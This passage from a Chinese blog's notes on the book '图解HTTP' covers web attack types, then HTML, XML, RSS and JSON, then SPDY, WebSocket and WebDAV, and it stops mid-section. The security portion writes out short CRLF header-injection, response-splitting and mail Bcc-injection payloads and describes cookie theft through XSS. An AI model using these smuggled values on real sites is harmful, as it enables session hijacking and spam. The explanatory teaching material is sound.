下面我们以选定某个类别后即可跳转至各类别对应页面的功能为例，讲解 HTTP 首部注入攻击。该功能为每个类别都设定了一个类别 ID 值，一旦选定某类别，就会将该 ID 值反映在响应内的Location 首部字段内，形如 Location: http://example.com/?cat=101。令浏览器发生重定向跳转。 攻击者以下面的内容替代之前的类别 ID 后发送请求。 1101%0D%0ASet-Cookie:+SID=123456789 其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http://hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。 发送该请求之后，假设结果返回以下响应。 12Location: http://example.com/?cat=101（%0D%0A ：换行符）Set-Cookie: SID=123456789 此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。 攻击者输入的 %0D%0A，原本应该属于首部字段 Location 的查询值部分，但经过解析后，%0D%0A 变成了换行符，结果插入了新的首部字段。这样一来，攻击者可在响应中插入任意的首部字段。 HTTP 响应截断攻击 HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做 HTTP 响应截断攻击。 1%0D%0A%0D%0A&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容 &lt;!--（原来页面对应的首部字段) --&gt; 在可能进行 HTTP 首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应。 123Set-Cookie: UID=（%0D%0A ：换行符）（%0D%0A ：换行符）&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容 &lt;!--（原来页面对应的首部字段)--&gt; 利用这个攻击，已触发陷阱的用户浏览器会显示伪造的 Web 页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。 另外，滥用 HTTP/1.1 中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替换掉的 Web 网页。 邮件首部注入攻击邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告邮件或病毒邮件。 攻击者将以下数据作为邮件地址发起请求。 1bob@hackr.jp%0D%0ABcc: user@example.com %0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本内容并发送。 1bob@hackr.jp%0D%0A%0D%0ATest Message 再以相同的方法，就有可能改写 To 和 Subject 等任意邮件首部，或向文本添加附件等动作。 目录遍历攻击目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历（Path Traversal）攻击。 通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用 …/ 等相对路径定位到 /etc/passed 等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。 远程文件包含漏洞远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。 这主要是 PHP 存在的安全漏洞，对 PHP 的 include 或 require 来说，这是一种可通过设定，指定外部服务器的 URL 作为文件名的功能。但是，该功能太危险，PHP5.2.0 之后默认设定此功能无效。固然存在输出值转义的问题，但更应控制对任意文件名的指定。 因设置或设计上的缺陷引发的安全漏因设置或设计上的缺陷引发的安全漏洞是指，错误设置 Web 服务器，或是由设计上的一些问题引起的安全漏洞。 强制浏览强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。 强制浏览有可能会造成以下一些影响。 泄露顾客的个人信息等重要情报 泄露原本需要具有访问权限的用户才可查阅的信息内容 泄露未外连到外界的文件 对那些原本不愿公开的文件，为了保证安全会隐蔽其 URL。可一旦知道了那些 URL，也就意味着可浏览 URL 对应的文件。直接显示容易推测的文件名或文件目录索引时，通过某些方法可能会使 URL 产生泄露。 不正确的错误消息处理不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。与 Web 应用有关的主要错误信息如下所示。 Web 应用抛出的错误消息 数据库等系统抛出的错误消息 Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示。 开放重定向开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。 因会话管理疏忽引发的安全漏洞会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果。 会话劫持会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。 具备认证功能的 Web 应用，使用会话 ID 的会话管理机制，作为管理认证状态的主流方式。会话 ID 中记录客户端的 Cookie 等信息，服务器端将会话 ID 与认证状态进行一对一匹配管理。 下面列举了几种攻击者可获得会话 ID 的途径。 通过非正规的生成方法推测会话 ID 通过窃听或 XSS 攻击盗取会话 ID 通过会话固定攻击（Session Fixation）强行获取会话 ID 会话劫持攻击案例 下面我们以认证功能为例讲解会话劫持。这里的认证功能通过会话管理机制，会将成功认证的用户的会话 ID（SID）保存在用户浏览器的 Cookie 中。 攻击者在得知该 Web 网站存在可跨站攻击（XSS）的安全漏洞后，就设置好用 JavaScript 脚本调用 document.cookie 以窃取Cookie 信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击者就能获取含有会话 ID 的 Cookie。攻击者拿到用户的会话 ID 后，往自己的浏览器的 Cookie 中设置该会话 ID，即可伪装成会话 ID 遭窃的用户，访问 Web 网站了。 会话固定攻击对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。 跨站点请求伪造跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。 跨站点请求伪造有可能会造成以下等影响。 利用已通过认证的用户权限更新设定信息等 利用已通过认证的用户权限购买商品 利用已通过认证的用户权限在留言板上发表言论 其他安全漏洞密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等），本节将会讲解对具备认证功能的 Web 应用进行的密码破解。 密码破解有以下两种手段。 通过网络的密码试错 对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况） 除去突破认证的攻击手段，还有 SQL 注入攻击逃避认证，跨站脚本攻击窃取密码信息等方法。 通过网络进行密码试错对 Web 应用提供的认证功能，通过网络尝试候选密码进行的一种攻击。主要有以下两种方式。 穷举法 字典攻击 穷举法穷举法（Brute-force Attack，又称暴力破解法）是指对所有密钥集合构成的密钥空间（Keyspace）进行穷举。即，用所有可行的候选密码对目标的密码系统试错，用以突破验证的一种攻击。 比如银行采用的个人识别码是由“4 位数字”组成的密码，那么就要从 0000~9999 中的全部数字逐个进行尝试。这样一来，必定在候选的密码集合中存在一个正确的密码，可通过认证。 因为穷举法会尝试所有的候选密码，所以是一种必然能够破解密码的攻击。但是，当密钥空间很庞大时，解密可能需要花费数年，甚至千年的时间，因此从现实角度考量，攻击是失败的。 字典攻击字典攻击是指利用事先收集好的候选密码（经过各种组合方式后存入字典），枚举字典中的密码，尝试通过认证的一种攻击手法。 与穷举法相比，由于需要尝试的候选密码较少，意味着攻击耗费的时间比较短。但是，如果字典中没有正确的密码，那就无法破解成功。因此攻击的成败取决于字典的内容。 对已加密密码的破解Web 应用在保存密码时，一般不会直接以明文的方式保存，通过散列函数做散列处理或加 salt 的手段对要保存的密码本身加密。那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这些密码，则必须先通过解码等手段，把加密处理的密码还原成明文形式。 从加密过的数据中导出明文通常有以下几种方法。 通过穷举法·字典攻击进行类推 彩虹表 拿到密钥 加密算法的漏洞 通过穷举法·字典攻击进行类推针对密码使用散列函数进行加密处理的情况，采用和穷举法或字典攻击相同的手法，尝试调用相同的散列函数加密候选密码，然后把计算出的散列值与目标散列值匹配，类推出密码。 彩虹表彩虹表（Rainbow Table）是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举法 • 字典攻击等实际破解过程中缩短消耗时间的技巧。从彩虹表内搜索散列值就可以推导出对应的明文密码。 为了提高攻击成功率，拥有一张海量数据的彩虹表就成了必不可少的条件。例如在 Free Rainbow Tables 网站上（http://www.freerainbowtables.com/en/tables2/）公布的一张由大小写字母及数字全排列的 1~8 位字符串对应的 MD5 散列值构成的彩虹表，其大小约为 1050 吉字节。 拿到密钥使用共享密钥加密方式对密码数据进行加密处理的情况下，如果能通过某种手段拿到加密使用的密钥，也就可以对密码数据解密了。 加密算法的漏洞考虑到加密算法本身可能存在的漏洞，利用该漏洞尝试解密也是一种可行的方法。但是要找到那些已广泛使用的加密算法的漏洞，又谈何容易，因此困难极大，不易成功。 而 Web 应用开发者独立实现的加密算法，想必尚未经过充分的验证，还是很有可能存在漏洞的。 点击劫持点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。 已设置陷阱的 Web 页面，表面上内容并无不妥，但早已埋入想让用户点击的链接。当用户点击到透明的按钮时，实际上是点击了已指定透明属性元素的 iframe 页面。 DoS 攻击DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。 主要有以下两种 DoS 攻击方式。 集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。 通过攻击安全漏洞使服务停止。 其中，集中利用访问请求的 DoS 攻击，单纯来讲就是发送大量的合法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防止 DoS 攻击。 多台计算机发起的 DoS 攻击称为 DDoS 攻击（Distributed Denial of Service attack）。DDoS 攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。 后门程序后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。 开发阶段作为 Debug 调用的后门程序 开发者为了自身利益植入的后门程序 攻击者通过某种方法设置的后门程序 可通过监视进程和通信的状态发现被植入的后门程序。但设定在 Web应用中的后门程序，由于和正常使用时区别不大，通常很难发现。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第十章）—— 构建 Web 内容的技术]]></title>
    <url>%2F2018-09-18-read-%E5%9B%BE%E8%A7%A3HTTP-Part10.html</url>
    <content type="text"><![CDATA[第十章 构建 Web 内容的技术HTMLWeb 页面几乎全由 HTML 构建HTML （HyperText Markup Language,超文本标记语言）是为了发送 Web 上的超文本（Hypertext）而开发的标记语言。超文本是一种文档系统，可将文档中任意位置的信息与其他信息（文本与图片等）建立关联，即超链接文本。标记语言是通过在文档的某部分穿插特别的字符串标签，用来修饰文档的语言。我们把出现在 HTML 文档内的这种特殊字符叫做 HTML 标签（Tag）. 平时我们浏览的 Web 页面几乎全是使用 HTML 写成的。由 HTML 构成的文档经过浏览器的解析、渲染后，呈现出来的结果就是 Web 页面。 设计应用 CSSCSS（Cascading Style Sheets，层叠样式表）可以指定如何展现 HTML内的各种元素，属于样式表标准之一。即使是相同的 HTML 文档，通过改变应用的 CSS，用浏览器看到的页面外观也会随之改变。CSS的理念就是让文档的结构和设计分离，达到解耦的目的。 动态 HTML让 Web 页面动起来的动态 HTML所谓动态 HTML（Dynamic HTML），是指使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。鼠标单击点开的新闻、Google Maps 等可滚动的地图就用到了动态 HTML。 动态 HTML 技术是通过调用客户端脚本语言 JavaScript，实现对HTML 的 Web 页面的动态改造。利用 DOM（Document Object Model，文档对象模型）可指定欲发生动态变化的 HTML 元素。 更易控制 HTML 的 DOMDOM 是用以操作 HTML 文档和 XML 文档的 API（ApplicationProgramming Interface，应用编程接口）。使用 DOM 可以将 HTML 内的元素当作对象操作，如取出元素内的字符串、改变那个 CSS 的属性等，使页面的设计发生改变。 Web 应用通过 Web 提供功能的 Web 应用Web 应用是指通过 Web 功能提供的应用程序。比如购物网站、网上银行、SNS、BBS、搜索引擎和 e-learning 等。互联网（Internet）或企业内网（Intranet）上遍布各式各样的 Web 应用。 与 Web 服务器及程序协作的 CGICGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的作用下，程序会对请求内容做出相应的动作，比如创建 HTML 等动态内容。 使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等编程语言编写而成。 因 Java 而普及的 ServletServlet （轻量服务程序）是一种能在服务器上创建动态内容的程序。Servlet 是用 Java语言实现的一个接口，属于面向企业级 Java（JavaEE，Java Enterprise Edition）的一部分。 CGI，由于每次接到请求，程序都要跟着启动一次。因此一旦访问量过大，Web 服务器要承担相当大的负载。而 Servlet 运行在与 Web 服务器相同的进程中，因此受到的负载较小 。Servlet 的运行环境叫做 Web 容器或 Servlet 容器。 Servlet 作为解决 CGI 问题的对抗技术 ，随 Java 一起得到了普及。随着 CGI 的普及，每次请求都要启动新 CGI 程序的 CGI 运行机制逐渐变成了性能瓶颈，所以之后 Servlet 和 mod_perl 等可直接在 Web 服务器上运行的程序才得以开发、普及。 数据发布的格式及语言可扩展标记语言XML（eXtensible Markup Language，可扩展标记语言）是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数据共享变得更容易。 XML 和 HTML 都是从标准通用标记语言 SGML（Standard Generalized Markup Language）简化而成。与 HTML 相比，它对数据的记录方式做了特殊处理。 HTML 编写的某公司的研讨会议议程为例。 1234567891011121314151617181920&lt;html&gt;&lt;head&gt;&lt;title&gt;T公司研讨会介绍&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;T公司研讨会介绍&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;研讨会编号：TR001 &lt;ul&gt; &lt;li&gt;Web应用程序脆弱性诊断讲座&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;研讨会编号：TR002 &lt;ul&gt; &lt;li&gt;网络系统脆弱性诊断讲座&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt; 用浏览器打开该文档时，就会显示排列的列表内容，但如果这些数据被其他程序读取会发生什么？某些程序虽然具备可通过识别布局特征取出文本的方法，但这份 HTML 的样式一旦改变，要读取数据内容也就变得相对困难了。可见，为了保持数据的正确读取，HTML 不适合用来记录数据结构。 接着将这份列表以 XML 的形式改写就成了以下的示例。 12345678&lt;研讨会 编号="TR001" 主题="Web应用程序脆弱性诊断讲座"&gt; &lt;类别&gt;安全&lt;/类别&gt; &lt;概要&gt;为深入研究Web应用程序脆弱性诊断必要的…&lt;/概要&gt;&lt;/研讨会&gt;&lt;研讨会 编号="TR002" 主题="网络系统脆弱性诊断讲座"&gt; &lt;类别&gt;安全&lt;/类别&gt; &lt;概要&gt;为深入研究网络系统脆弱性诊断必要的…&lt;/概要&gt;&lt;/研讨会&gt; 发布更新信息的 RSS/AtomRSS（简易信息聚合，也叫聚合内容）和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。两者都用到了 XML。 RSS 有以下版本，名称和编写方式也不相同。 RSS 0.9（RDF Site Summary）：最初的 RSS 版本。1999 年 3 月由网景通信公司自行开发用于其门户网站。基础构图创建在初期的 RDF规格上。 RSS 0.91（Rich Site Summary）：在 RSS0.9 的基础上扩展元素，于1999 年 7 月开发完毕。非 RDF 规格，使用 XML 方式编写。 RSS 1.0（RDF Site Summary）：RSS 规格正处于混乱状态。2000 年12 月由 RSS-DEV 工作组再次采用 RSS0.9 中使用的 RDF 规格发布。 RSS2.0（Really Simple Syndication）：非 RSS1.0 发展路线。增加支持 RSS0.91 的兼容性，2000 年 12 月由 UserLand Software 公司开发完成。 Atom 具有以下两种标准。Atom 供稿格式（Atom Syndication Format）：为发布内容而制定的网站消息来源格式，单讲 Atom 时，就是指此标准。 Atom 出版协定（Atom Publishing Protocol）：为 Web 上内容的新增或修改而制定的协议。 用于订阅博客更新信息的 RSS 阅读器，这种应用几乎支持 RSS 的所有版本以及 Atom。 下面是 RSS1.0 的示例。 123456789101112131415161718192021&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;?xml-stylesheet href="http://d.hatena.ne.jp/sen-u/rssxsl" type="text/xsl" media="screen"?&gt;&lt;rdf:RDFxmlns="http://purl.org/rss/1.0/"xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"xmlns:content="http://purl.org/rss/1.0/modules/content/"xmlns:dc="http://purl.org/dc/elements/1.1/"xml:lang="ja"&gt;&lt;channel rdf:about="http://d.hatena.ne.jp/sen-u/rss"&gt;&lt;title&gt;兔子的文学日记&lt;/title&gt;&lt;link&gt;http://d.hatena.ne.jp/sen-u/&lt;/link&gt;&lt;description&gt;兔子的文学日记&lt;/description&gt;&lt;/channel&gt;&lt;item rdf:about="http://d.hatena.ne.jp/sen-u/20121215/p1"&gt;&lt;title&gt;[security]提供脆弱性悬赏奖金计划的网站一览&lt;/title&gt;&lt;link&gt;http://d.hatena.ne.jp/sen-u/20121215/p1&lt;/link&gt;&lt;description&gt; 正是所谓“是所谓 Bounty Programs”、处理接受Web脆弱性的相关信息，并提供奖金的计划 ...&lt;/description&gt;&lt;dc:creator&gt;sen-u&lt;/dc:creator&gt;&lt;dc:date&gt;2012-12-15&lt;/dc:date&gt;&lt;dc:subject&gt;security&lt;/dc:subject&gt;&lt;/item&gt; JavaScript 衍生的轻量级易用 JSONJSON（JavaScript Object Notation）是一种以JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语言。能够处理的数据类型有 false/null/true/ 对象 / 数组 / 数字 / 字符串，这 7 种类型。 1&#123;"name": "Web Application Security", "num": "TR001"&#125; JSON 让数据更轻更纯粹，并且 JSON 的字符串形式可被 JavaScript轻易地读入。当初配合 XML 使用的 Ajax 技术也让 JSON 的应用变得更为广泛。另外，其他各种编程语言也提供丰富的库类，以达到轻便操作 JSON 的目的。 参考链接：https://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出HTTP，从开始到放弃（第九章）—— 基于 HTTP 的功能追加协议]]></title>
    <url>%2F2018-09-15-read-%E5%9B%BE%E8%A7%A3HTTP-Part9.html</url>
    <content type="text"><![CDATA[第九章 基于 HTTP 的功能追加协议基于 HTTP 的协议随着时代的发展，Web 的用途更具多样性，比如演化成在线购物网站、SNS（Social Networking Service，社交网络服务）、企业或组织内部的各种管理工具，等等。 而这些网站所追求的功能可通过 Web 应用和脚本程序实现。即使这些功能已经满足需求，在性能上却未必最优，这是因为 HTTP 协议上的限制以及自身性能有限。 HTTP 功能上的不足可通过创建一套全新的协议来弥补。可是目前基于 HTTP 的 Web 浏览器的使用环境已遍布全球，因此无法完全抛弃HTTP。有一些新协议的规则是基于 HTTP 的，并在此基础上添加了新的功能。 消除 HTTP 瓶颈的 SPDY（现如今逐渐被淘汰）Google 在 2010 年发布了 SPDY（取自 SPeeDY，发音同 speedy），其开发目标旨在解决 HTTP 的性能瓶颈，缩短 Web 页面的加载时间（50%）。 SPDY - The Chromium Projects http://www.chromium.org/spdy/ HTTP 的瓶颈使用 HTTP 协议探知服务器上是否有内容更新，就必须频繁地从客户端到服务器端进行确认。如果服务器上没有内容更新，那么就会产生徒劳的通信。 若想在现有 Web 实现所需的功能，以下这些 HTTP 标准就会成为瓶颈。 一条连接上只能发送一个请求 请求只能从客户端开始。客户端不可以接受除响应以外的指令 请求/ 响应 首部未经压缩就发送，首部消息越多延迟越大。 发送冗长的首部，每次互相发送相同的首部造成的浪费较多。 可任意选择数据压缩格式，非强制压缩发送。 Ajax 的解决方法Ajax（Asynchronous JavaScript and XML，异步 JavaScript 与 XML 技术）是一种有效利用 JavaScript 和 DOM （Document Object Model，文档对象模型）的操作，以达到局部 Web 页面替换加载的异步通信手段。和以前的通信相比，由于它只更新一部分页面，响应中传输的数据量会因此减少，这一优点是显而易见的。 Ajax 的核心技术是名为 XMLHttpRequest 的 API，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。 而利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。 Comet 的解决方法一旦服务器端有内容更新，Comet 不会让请求等待，而是直接给客户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端推送（Server Push）的功能。 通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即反馈给客户端。 内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet也仍未解决 HTTP 协议本身存在的问题。 SPDY 的目标陆续出现的 Ajax 和 Comet 等提高易用性的技术，一定程度上使 HTTP得到了改善，但 HTTP 协议本身的限制也令人有些束手无策。为了进行根本性的改善，需要有一些协议层面上的改动。处于持续开发状态中的 SPDY 协议，正是为了在协议级别消除 HTTP所遭遇的瓶颈。 （Google宣布计划淘汰该公司在2009年推出的SPDY协议，SPDY原本定位为替代HTTP协议的新协议，Google原本打算以它来加速HTTP的传输速度并推动成为标准，不过现在决定将支持HTTP/2，并逐渐淘汰SPDY） SPDY 的设计与功能SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。 SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。 使用 SPDY 后，HTTP 协议额外获得以下功能。 多路复用流通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。所有请求的处理都在一条 TCP 连接上完成，因此 TCP 的处理效率得到提高 赋予请求优先级SPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响应变慢的问题。 压缩 HTTP 首部压缩 HTTP 请求和响应的首部。这样一来，通信产生的数据包数量和发送的字节数就更少了。 推送功能支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送数据，而不必等待客户端的请求。 服务器提示功能服务器可以主动提示客户端请求所需的资源。由于在客户端发现资源之前就可以获知资源的存在，因此在资源已缓存等情况下，可以避免发送不必要的请求。 SPDY 消除 Web 瓶颈了吗SPDY 基本上只是将单个域名（ IP 地址）的通信多路复用，所以当一个 Web 网站上使用多个域名下的资源，改善效果就会受到限制。 SPDY 的确是一种可有效消除 HTTP 瓶颈的技术，但很多 Web 网站存在的问题并非仅仅是由 HTTP 瓶颈所导致。对 Web 本身的速度提升，还应该从其他可细致钻研的地方入手，比如改善 Web 内容的编写方式等。 使用浏览器进行全双工通信的WebSocket利用 Ajax 和 Comet 技术进行通信可以提升 Web 的浏览速度。但问题在于通信若使用 HTTP 协议，就无法彻底解决瓶颈问题。WebSocket网络技术正是为解决这些问题而实现的一套新协议及 API。 当时筹划将 WebSocket 作为 HTML5 标准的一部分，而现在它却逐渐变成了独立的协议标准。WebSocket 通信协议在 2011 年 12 月 11 日，被 RFC 6455 - The WebSocket Protocol 定为标准。 WebSocket 的设计与功能WebSocket，即 Web 浏览器与 Web 服务器之间全双工通信标准。其中，WebSocket 协议由 IETF 定为标准，WebSocket API 由 W3C 定为标准。仍在开发中的 WebSocket 技术主要是为了解决 Ajax 和 Comet里 XMLHttpRequest 附带的缺陷所引起的问题。 WebSocket 协议一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接，之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML 或图片等任意格式的数据。 由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端，而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。 WebSocket 协议的主要特点。推送功能 支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。 减少通信量 只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息很小，通信量也相应减少了。 为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一次“握手”（Handshaking）的步骤。 握手·请求 为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变，以达到握手的目的。 12345678GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==Origin: http://example.comSec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13 Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。Sec-WebSocket-Protocol 字段内记录使用的子协议。 子协议按 WebSocket 协议标准在连接分开使用时，定义那些连接的名称。 握手·响应 对于之前的请求，返回状态码 101 Switching Protocols 的响应。 12345HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=Sec-WebSocket-Protocol: chat Sec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。 成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。 WebSocket API JavaScript 可调用“The WebSocketAPI”（http://www.w3.org/TR/websockets/，由 W3C 标准制定）内提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。以下为调用 WebSocket API，每 50ms 发送一次数据的实例。 1234567var socket = new WebSocket('ws://game.example.com:12010/updates');socket.onopen = function () &#123; setInterval(function() &#123; if (socket.bufferedAmount == 0) socket.send(getUpdateData()); &#125;, 50);&#125;; 期盼已久的 HTTP/2.0HTTP/2 （原名HTTP/2.0）即超文本传输协议 2.0，是下一代HTTP协议。是由互联网工程任务组（IETF）的Hypertext Transfer Protocol Bis (httpbis)工作小组进行开发。是自1999年http1.1发布后的首个更新。HTTP 2.0在2013年8月进行首次合作共事性测试。在开放互联网上HTTP 2.0将只用于https://网址，而 http://网址将继续使用HTTP/1，目的是在开放互联网上增加使用加密技术，以提供强有力的保护去遏制主动攻击。DANE RFC6698允许域名管理员不通过第三方CA自行发行证书。（摘自百度百科） HTTP/2.0英文文档 Web 服务器管理文件的 WebDAVWebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1的协议定义在 RFC4918。除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的版本控制功能。 使用 HTTP/1.1 的 PUT 方法和 DELETE 方法，就可以对 Web 服务器上的文件进行创建和删除操作。可是出于安全性及便捷性等考虑，一般不使用。 扩展 HTTP/1.1 的 WebDAV针对服务器上的资源，WebDAV 新增加了一些概念，如下所示。 集合（Collection）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。 资源（Resource）：把文件或集合称为资源。 属性（Property）：定义资源的属性。定义以“名称 = 值”的格式执行。 锁（Lock）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。 WebDAV 内新增的方法及状态码WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。 PROPFIND ：获取属性PROPPATCH ：修改属性MKCOL ：创建集合COPY ：复制资源及属性MOVE ：移动资源LOCK ：资源加锁UNLOCK ：资源解锁为配合扩展的方法，状态码也随之扩展。102 Processing ：可正常处理请求，但目前是处理中状态207 Multi-Status ：存在多种状态422 Unprocessible Entity ：格式正确，内容有误423 Locked ：资源已被加锁424 Failed Dependency ：处理与某请求关联的请求失败，因此不再维持依赖关系 507 Insufficient Storage ：保存空间不足 WebDAV 的请求实例下面是使用 PROPFIND 方法对 http://www.example.com/file 发起获取属性的请求。 12345678910111213PROPFIND /file HTTP/1.1Host: www.example.comContent-Type: application/xml; charset="utf-8"Content-Length: 219&lt;?xml version="1.0" encoding="utf-8" ?&gt;&lt;D:propfind xmlns:D="DAV:"&gt; &lt;D:prop xmlns:R="http://ns.example.com/boxschema/"&gt; &lt;R:bigbox/&gt; &lt;R:author/&gt; &lt;R:DingALing/&gt; &lt;R:Random/&gt; &lt;/D:prop&gt;&lt;/D:propfind&gt; WebDAV 的响应实例 下面是针对之前的 PROPFIND 方法，返回http://www.example.com/file 的属性的响应。 